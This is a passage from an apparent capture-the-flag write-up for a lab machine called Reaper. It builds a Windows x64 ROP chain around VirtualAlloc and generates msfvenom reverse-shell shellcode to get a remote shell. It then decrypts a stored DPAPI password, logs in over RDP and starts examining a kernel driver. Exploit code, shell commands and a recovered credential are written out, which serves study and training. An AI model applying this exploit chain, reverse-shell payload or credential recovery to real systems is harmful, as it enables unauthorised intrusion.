+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rbx</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_r9_rbx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">JUNKJUNK</span><span class="sh">"</span>
+    <span class="k">return</span> <span class="n">payload</span>
+</code></pre></div></div>
+<p>This gadget wipes R8, which I will need to set, so I’m doing it first. It also adds 8 to RSP, so I’m adding some junk there to hold the space.</p>
+<h4 id="lpaddress">lpAddress</h4>
+<p>The address I want to get into the <code class="language-plaintext highlighter-rouge">lpAddress</code> / RCX is something on the stack. I’ll notice when I hit the overwrite that R9, R11, and RSP (obviously) all have stack addresses:</p>
+<p><a href="/img/image-20250822153631568.png"><img alt="image-20250822153631568" src="/img/image-20250822153631568.png"/><em>Click for full size image</em></a></p>
+<p>A bunch of playing around shows that R9 it not reliable. Sometimes R8 is. I’d like to avoid these all together.</p>
+<p>Some more <code class="language-plaintext highlighter-rouge">grep</code> shows that I can XOR RBX with RSP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ropper.txt | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">': ... ..., rsp'</span>
+<span class="go">0x0000000140001fa0: xor rbx, rsp; ret; 
+0x000000014000e875: xor rcx, rsp; call 0x1ee90; add rsp, 0x58; ret; 
+0x000000014000434a: xor rcx, rsp; call 0x1ee90; add rsp, 0xe0; pop rbp; ret; 
+0x00000001400091d5: xor rcx, rsp; call 0x1ee90; mov rbx, qword ptr [rsp + 0x368]; add rsp, 0x34
+</span></code></pre></div></div>
+<p>If I can set RBX to 0, XOR is with RSP, and then move RBX to RCX, that’s a path. I’ve already got a <code class="language-plaintext highlighter-rouge">pop rbx</code> gadget from the previous section. I can’t find a good way to load RBX into RCX, but there’s a way to get RBX into RAX:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x0000000140001fc2: push rbx; pop rax; ret;
+</span></code></pre></div></div>
+<p>And then a way to get RAX into RCX:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x0000000140001f80: mov rcx, rax; ret; 
+</span></code></pre></div></div>
+<p>That should be reliable:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">xor_rbx_rsp</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1fa0</span><span class="p">)</span>
+<span class="n">push_rbx_pop_rax</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1fc2</span><span class="p">)</span>
+<span class="n">mov_rcx_rax</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1f80</span><span class="p">)</span>
+
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+
+<span class="k">def</span> <span class="nf">load_RCX_stack</span><span class="p">():</span>
+    <span class="sh">"""</span><span class="s">Side effects: changes AL</span><span class="sh">"""</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rbx</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">xor_rbx_rsp</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">push_rbx_pop_rax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_rcx_rax</span>
+    <span class="k">return</span> <span class="n">payload</span>
+</code></pre></div></div>
+<h4 id="flallocationtype">flAllocationType</h4>
+<p>I need to get 0x1000 into R8. I can’t find any good <code class="language-plaintext highlighter-rouge">mov</code> gadgets into R8. I did find an <code class="language-plaintext highlighter-rouge">add</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x0000000140003918: add r8, r9; add rax, r8; ret; 
+</span></code></pre></div></div>
+<p>Assuming I don’t care about RAX, I can call this over and over. I’ve already set R9 to 0x40. I can just call this one 40 times:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add_r8_r9</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x3918</span><span class="p">)</span> <span class="c1"># messes with RAX
+</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">//</span> <span class="mh">0x40</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">add_r8_r9</span>
+</code></pre></div></div>
+<h4 id="jmp-virtualalloc">jmp VirtualAlloc</h4>
+<p>There aren’t a lot of great gadgets for getting a value into RDX. I don’t see anything promising in <code class="language-plaintext highlighter-rouge">ropper</code> output:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ropper.txt | <span class="nb">grep</span> <span class="s1">': mov rdx,'</span>
+<span class="go">0x0000000140001b0c: mov rdx, 0xffffffffffffffff; mov rcx, qword ptr [rsp + 0x40]; call 0x1a60; add rsp, 0x38; ret; 
+0x000000014001f550: mov rdx, qword ptr [rbp + 0xb8]; call 0x56b4; nop; add rsp, 0x20; pop rbp; ret; 
+0x0000000140005b4d: mov rdx, qword ptr [rdx]; mov r8d, 2; call 0x39d0; add rsp, 0x28; ret; 
+0x0000000140005b33: mov rdx, qword ptr [rdx]; mov rax, rcx; call 0x39d0; call rax; 
+0x00000001400184b1: mov rdx, qword ptr [rip + 0x7e50]; call rdx; 
+0x0000000140005c02: mov rdx, qword ptr [rsp + 0x38]; mov r8d, 2; call 0x39d0; add rsp, 0x28; ret; 
+0x0000000140001a41: mov rdx, qword ptr [rsp + 0x40]; mov rcx, qword ptr [rax]; call 0x8d98; add rsp, 0x38; ret; 
+0x0000000140001b6d: mov rdx, qword ptr [rsp + 0x40]; mov rcx, qword ptr [rax]; call 0xe52c; add rsp, 0x38; ret; 
+0x000000014000368f: mov rdx, r13; call rax; 
+0x000000014001ee03: mov rdx, r9; call 0x1ee18; mov eax, 1; add rsp, 0x28; ret;
+</span></code></pre></div></div>
+<p>The second to late one could be good, but <code class="language-plaintext highlighter-rouge">call rax</code> is bad, as it will push a new return address onto the stack and return to this same spot and keep going. There’s a potential option in the <code class="language-plaintext highlighter-rouge">ROPgadget</code> output:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ropgadget.txt | <span class="nb">grep</span> <span class="s1">': mov rdx, r'</span>
+<span class="go">0x000000014000368f : mov rdx, r13 ; call rax
+0x000000014001b993 : mov rdx, r8 ; jmp 0x14001dd7c
+0x0000000140005adb : mov rdx, r8 ; jmp rax
+0x0000000140013f35 : mov rdx, r9 ; jmp 0x140014028
+0x000000014001b99b : mov rdx, r9 ; mov rcx, r8 ; jmp 0x14001dd84
+0x0000000140019b29 : mov rdx, r9 ; mov word ptr [rbx], cx ; jmp 0x140019b58
+0x0000000140005aea : mov rdx, rax ; mov r8d, r9d ; jmp r10
+0x00000001400043c7 : mov rdx, rbx ; test rbx, rbx ; je 0x1400043e5 ; jmp 0x1400043be
+0x000000014001a5e3 : mov rdx, rcx ; mov byte ptr [rsi], 0x30 ; jmp 0x14001a600
+0x000000014000ce78 : mov rdx, rsi ; jmp 0x14000cef5
+</span></code></pre></div></div>
+<p>The third row moves R8 into RDX and then <code class="language-plaintext highlighter-rouge">jmp rax</code>. This is still more challenging than a <code class="language-plaintext highlighter-rouge">ret</code>, but if I can see RAX to the <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> address, this will actually work. <code class="language-plaintext highlighter-rouge">jmp</code> just goes to the location, where as <code class="language-plaintext highlighter-rouge">call</code> will push a return value onto the stack (messing up my ROPchain).</p>
+<p>There’s a <code class="language-plaintext highlighter-rouge">pop rax</code> gadget:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x000000014000150a: pop rax; ret; 
+</span></code></pre></div></div>
+<p>I’ll use that to get the address of the import address table (IAT) entry for <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> into RAX. I’ll need a gadget to get the address pointed to. This one should work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x000000014001547f: mov rax, qword ptr [rax]; add rsp, 0x28; ret;
+</span></code></pre></div></div>
+<p>It will have the side effect of jumping the stack 0x28 bytes forward, but I can just pad that with junk.</p>
+<p>In Ghidra the address of the IAT for <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> is at 0x140020000, or 0x20000 from the base address:</p>
+<picture>
+<source srcset="/img/image-20250822204222455.webp" type="image/webp"/>
+<img alt="image-20250822204222455" class="include_image" loading="lazy" src="/img/image-20250822204222455.png"/>
+</picture>
+<p>I’ll add this code to set RAX:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pop_rax</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x150a</span><span class="p">)</span>
+<span class="n">deref_rax</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1547f</span><span class="p">)</span>
+
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+
+<span class="k">def</span> <span class="nf">load_RAX_from_IAT</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rax</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">deref_rax</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">X</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x28</span>
+    <span class="k">return</span> <span class="n">payload</span>
+</code></pre></div></div>
+<p>It is important that I do this after the shellcode above that stomps on RAX.</p>
+<h4 id="dwsize">dwSize</h4>
+<p>At this point, I’ve already made a loop to load 0x1000 into R8. That value should actually work fine for <code class="language-plaintext highlighter-rouge">dwSize</code>. That means I just need to use the gadget from above to both load 0x1000 into RDX and then jump to <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x0000000140005adb : mov rdx, r8 ; jmp rax
+</span></code></pre></div></div>
+<p>I’ll just add the gadget to the payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mov_rdx_r8_jmp_rax</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x5adb</span><span class="p">)</span>
+</code></pre></div></div>
+<h4 id="return-to-shellcode">Return to Shellcode</h4>
+<p>When this all works, now I have an executable stack and I control the return address from <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>. I’ll push RSP to the stack:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x000000014001becd : push rsp ; and al, 8 ; ret
+</span></code></pre></div></div>
+<p>Now it will return to what’s next. I’ll make a function to generate shellcode (like in <a href="/2025/08/07/htb-rainbow.html#local-exploit">Rainbow</a>):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">generate_shellcode</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT</span><span class="p">):</span>
+    <span class="n">msfvenom</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="s">msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp -f hex sc LHOST=</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s"> LPORT=</span><span class="si">{</span><span class="n">LPORT</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">split</span><span class="p">(),</span>
+        <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
+        <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
+        <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Generating shellcode</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">msfvenom</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">unhex</span><span class="p">(</span><span class="n">msfvenom</span><span class="p">.</span><span class="n">stdout</span><span class="p">)</span>
+</code></pre></div></div>
+<p>And update my usage:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;RHOST&gt; &lt;LHOST&gt; &lt;LPORT&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+</code></pre></div></div>
+<p>I’ll add these to my payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">push_rsp = p64(base_addr + 0x1becd)
+
+...[snip]...
+
+payload += push_rsp
+payload += generate_shellcode(sys.argv[2], int(sys.argv[3]))
+</span></code></pre></div></div>
+<h4 id="debug-failure">Debug Failure</h4>
+<p>I’ll give this a run against my local instance, and it crashes without a shell. I’ll debug stepping through the ROP to find the issue. At the point where it’s about to jump to <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, the stack looks good:</p>
+<picture>
+<source srcset="/img/image-20250823081021991.webp" type="image/webp"/>
+<img alt="image-20250823081021991" class="include_image" loading="lazy" src="/img/image-20250823081021991.png"/>
+</picture>
+<p>However, when I reach the <code class="language-plaintext highlighter-rouge">ret</code> at the end of <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, the return address is still the same, but the first two words of the shellcode have been overwritten:</p>
+<picture>
+<source srcset="/img/image-20250823081434760.webp" type="image/webp"/>
+<img alt="image-20250823081434760" class="include_image" loading="lazy" src="/img/image-20250823081434760.png"/>
+</picture>
+<p>To get around this, I’ll add 0x10 to RSP and then have it return to <code class="language-plaintext highlighter-rouge">push rsp</code>. There’s a gadget:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x0000000140002029: add rsp, 0x10; ret; 
+</span></code></pre></div></div>
+<p>In my code, this looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add_rsp_0x10</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x2029</span><span class="p">)</span>
+
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">add_rsp_0x10</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x10</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">push_rsp</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">generate_shellcode</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]))</span>
+</code></pre></div></div>
+<p>The 0x10 bytes of nops will be overwritten, but I’ll move RSP past those and return to push. Running it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py 10.0.0.202 10.0.0.201 443
+<span class="go">[+] Opening connection to 10.0.0.202 on port 4141: Done
+[+] Leaked string address: 0x7ff75a7f0660
+[+] Base address: 0x7ff75a7d0000
+[*] Generating shellcode
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of hex file: 920 bytes
+</span></code></pre></div></div>
+<p>And at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.0.0.202 59176
+Microsoft Windows [Version 10.0.19045.3693]
+(c) Microsoft Corporation. All rights reserved.
+
+FLARE-VM Sat 08/23/2025  8:18:50.36
+</span><span class="gp">C:\Users\0xdf\Desktop\reaper&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>This works remotely too:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py 10.129.234.65 10.10.14.79 443
+<span class="go">[+] Opening connection to 10.129.234.65 on port 4141: Done
+[+] Leaked string address: 0x7ff6cb480660
+[+] Base address: 0x7ff6cb460000
+[*] Generating shellcode
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of hex file: 920 bytes
+</span></code></pre></div></div>
+<p>And returns a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.65 59310
+Microsoft Windows [Version 10.0.19045.6216]
+(c) Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\keysvc&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>And I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\keysvc\Desktop&gt;</span><span class="nb">type </span>user.txt
+<span class="go">ffe18953************************
+</span></code></pre></div></div>
+<p>I’ll switch to PowerShell as well by running <code class="language-plaintext highlighter-rouge">powershell</code>.</p>
+<h3 id="rdp">RDP</h3>
+<h4 id="recover-password">Recover Password</h4>
+<p>In <code class="language-plaintext highlighter-rouge">C:\users\keysvc</code> there’s a file named <code class="language-plaintext highlighter-rouge">automation.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\keysvc&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">automation.txt</span><span class="w">
+</span><span class="go">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000341bbb10d13d3e44aed494db4d7c707a00000000020000000000106600000001000020000000de5dc4e2b0fe4f0961781bfe57daf18002dfaf18f707c2fd22e6bdca522687ef000000000e8000000002000020000000bb15043fce50b323c82b2c877b3d35feabfda4deea2665140e62d33e6e8b4a632000000008a436f3a9597db950317a79aca0b37821b3b7f8bc4f08f7782bf476b446e70040000000a993f649dfaa7775dde9f7062c6b0d8c409de961319346bb71ff390675061b18f7486046f23bff90591816b80d5556f88732bd497e71c6ecac34aeae057d9008
+</span></code></pre></div></div>
+<p>This file starts with <code class="language-plaintext highlighter-rouge">01000000d08c9ddf0115d1118c7a00c04fc297eb</code>, which is the <a href="https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/">“signature” for a DPAPI blob</a>.</p>
+<p>I’ll decrypt it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\keysvc&gt;</span><span class="w"> </span><span class="nv">$secureString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nx">automation.txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w">
+</span><span class="gp">PS C:\Users\keysvc&gt;</span><span class="w"> </span><span class="nv">$ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">SecureStringToBSTR</span><span class="p">(</span><span class="nv">$secureString</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\Users\keysvc&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">PtrToStringBSTR</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">)</span><span class="w">
+</span><span class="go">CatWinterMist10
+</span></code></pre></div></div>
+<h4 id="validate">Validate</h4>
+<p>LDAP and SMB aren’t open on the host, but I can check the creds with the keysvc user against RDP. Even if the user can’t RDP, it will still say if they are valid or not:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp 10.129.234.65 <span class="nt">-u</span> keysvc <span class="nt">-p</span> CatWinterMist10
+<span class="netexec-protocol">RDP </span><span class="go">        10.129.234.65   3389   REAPER           </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 19041 (name:REAPER) (domain:reaper) (nla:False)
+</span><span class="netexec-protocol">RDP </span><span class="go">        10.129.234.65   3389   REAPER           </span><span class="netexec-logsuccess">[+]</span><span class="go"> reaper\keysvc:CatWinterMist10 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go">
+</span></code></pre></div></div>
+<p>In this case it says “(Pwn3d!)”, so not only do they work, but keysvc can RDP.</p>
+<h4 id="connect">Connect</h4>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">xfreerdp /u:keysvc /p:CatWinterMist10 /v:10.129.234.65 +clipboard</code> to connect and get a session:</p>
+<picture>
+<source srcset="/img/image-20250825095615049.webp" type="image/webp"/>
+<img alt="image-20250825095615049" class="include_image" loading="lazy" src="/img/image-20250825095615049.png"/>
+</picture>
+<h2 id="shell-as-system">Shell as SYSTEM</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="users">Users</h4>
+<p>There’s nothing else of interest in the keysvc user’s home directory. Other than <code class="language-plaintext highlighter-rouge">Public</code> and <code class="language-plaintext highlighter-rouge">Administrator</code>, there are no other users with a home directory:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         7/25/2023   5:23 AM                Administrator
+d-----         4/15/2025   7:26 PM                keysvc
+d-r---         7/25/2023   4:41 AM                Public   
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">Public</code> is empty, and keysvc can’t access <code class="language-plaintext highlighter-rouge">Administrator</code>.</p>
+<h4 id="system-root">System Root</h4>
+<p>There are a few non-standard directories at the system root:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         7/27/2023   9:37 AM                driver
+d-----         8/15/2023  12:14 AM                ftp
+d-----         7/25/2023   5:33 AM                inetpub
+d-----         8/15/2023  12:09 AM                keysvc
+d-----         12/7/2019   1:14 AM                PerfLogs
+d-r---         4/15/2025   7:44 PM                Program Files
+d-r---         7/25/2023   5:33 AM                Program Files (x86)
+d-r---         7/25/2023   5:29 AM                Users
+d-----         8/16/2025  12:34 PM                Windows 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">ftp</code> has the files I got over FTP earlier:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">ftp</span><span class="w">
+</span><span class="go">
+    Directory: C:\ftp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         8/15/2023  12:12 AM            262 dev_keys.txt
+-a----         8/14/2023   2:53 PM         187392 dev_keysvc.exe 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">inetpub</code> is a standard IIS install, with the default page and image in <code class="language-plaintext highlighter-rouge">\inetpub\wwwroot</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">driver</code> has a single file:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\driver&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\driver
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/27/2023   9:12 AM           8432 reaper.sys 
+</span></code></pre></div></div>
+<p>It is running on Reaper:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\driver&gt;</span><span class="w"> </span><span class="n">driverquery</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">reaper.sys</span><span class="w">
+</span><span class="go">reaper       reaper                 reaper                 Kernel        Auto       Running    OK         TRUE        FALSE        0                 4,096       0          7/27/2023 9:12:21 AM   \??\C:\driver\reaper.sys
+</span></code></pre></div></div>
+<p>I’ll create an SMB share on my system and copy this onto it.</p>
+<h4 id="os-version">OS Version</h4>
+<p>The OS is Windows 10 Pro:</p>
+<div class="language-console code-collapse windows-console highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\driver&gt;</span><span class="w"> </span><span class="n">systeminfo</span><span class="w">
+</span><span class="go">
+Host Name:                 REAPER
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19045 N/A Build 19045
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          labadm
+Registered Organization:   
+Product ID:                00330-80112-18556-AA460
+Original Install Date:     7/25/2023, 4:30:54 AM
+System Boot Time:          8/23/2025, 5:38:32 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware20,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              VMware, Inc. VMW201.00V.24224532.B64.2408191502, 8/19/2024
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 3,114 MB
+Virtual Memory: Max Size:  5,503 MB
+Virtual Memory: Available: 4,664 MB
+Virtual Memory: In Use:    839 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 13 Hotfix(s) Installed.
+                           [01]: KB5056578
+                           [02]: KB5028853
+                           [03]: KB5011048
+                           [04]: KB5015684
+                           [05]: KB5020683
+                           [06]: KB5026037
+                           [07]: KB5033052
+                           [08]: KB5063709
+                           [09]: KB5014032
+                           [10]: KB5016705
+                           [11]: KB5028318
+                           [12]: KB5054682
+                           [13]: KB5063261
+Network Card(s):           2 NIC(s) Installed.
+                           [01]: Microsoft Kernel Debug Network Adapter
+                                 Connection Name: Ethernet (Kernel Debugger)
+                                 Status:          Hardware not present
+                           [02]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.129.0.1
+                                 IP address(es)
+                                 [01]: 10.129.234.65
+                                 [02]: fe80::64e1:bf06:483b:7efc
+                                 [03]: dead:beef::e9a4:fa53:eef5:c874
+                                 [04]: dead:beef::5e8f:ee29:45b0:22c0
+                                 [05]: dead:beef::1c6
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</span></code></pre></div></div>
+<h3 id="reapersys">reaper.sys</h3>
+<h4 id="main-1">main</h4>
+<p>I’ll open this in Ghidra and take a look. This is a pretty small binary.</p>
